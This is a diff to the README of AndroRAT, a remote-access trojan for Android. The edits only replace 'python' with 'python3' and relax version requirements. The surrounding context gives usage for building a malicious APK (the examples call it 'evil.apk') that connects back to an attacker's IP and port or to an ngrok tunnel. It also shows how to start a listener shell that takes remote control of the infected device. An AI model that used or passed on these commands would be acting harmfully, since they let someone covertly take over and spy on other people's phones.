@@ -26,7 +26,7 @@ AndroRAT is a tool designed to give the control of the android system remotely a
 
 
 ## Prerequisites
-AndroRAT requires Python (3.6-3.8) and JAVA 8 (or Android Studio)
+AndroRAT requires Python3 and JAVA (or Android Studio)
 
 ## Installation
 ```
@@ -59,7 +59,7 @@ You must run Git bash with administrator privileges.
 
 ```
 Usage:
-  python androRAT.py --build --ngrok [flags]
+  python3 androRAT.py --build --ngrok [flags]
   Flags:
     -p, --port              Attacker port number (optional by default its set to 8000)
     -o, --output            Name for the apk file (optional by default its set to "karma.apk")
@@ -68,7 +68,7 @@ Usage:
 
 ```
 Usage:
-  python androRAT.py --build [flags]
+  python3 androRAT.py --build [flags]
   Flags:
     -i, --ip                Attacker IP address (required)
     -p, --port              Attacker port number (required)
@@ -80,7 +80,7 @@ Or you can manually build the apk by importing [Android Code](Android_Code) fold
 ### `shell` mode
 ```
 Usage:
-  python androRAT.py --shell [flags]
+  python3 androRAT.py --shell [flags]
   Flags:
     -i, --ip                Listner IP address
     -p, --port              Listner port number
@@ -117,13 +117,13 @@ In the sh shell there are some sub commands
 ## Examples
 
 * To build the apk using ngrok which will also set the listner:
-```python androRAT.py --build --ngrok -o evil.apk```
+```python3 androRAT.py --build --ngrok -o evil.apk```
 
 * To build the apk using desired ip and port:
-```python androRAT.py --build -i 192.169.x.x -p 8000 -o evil.apk```
+```python3 androRAT.py --build -i 192.169.x.x -p 8000 -o evil.apk```
 
 * To get the interpreter:
-```python androRAT.py --shell -i 0.0.0.0 -p 8000```
+```python3 androRAT.py --shell -i 0.0.0.0 -p 8000```
 
 ## Interpreter Examples
 * Generating APK
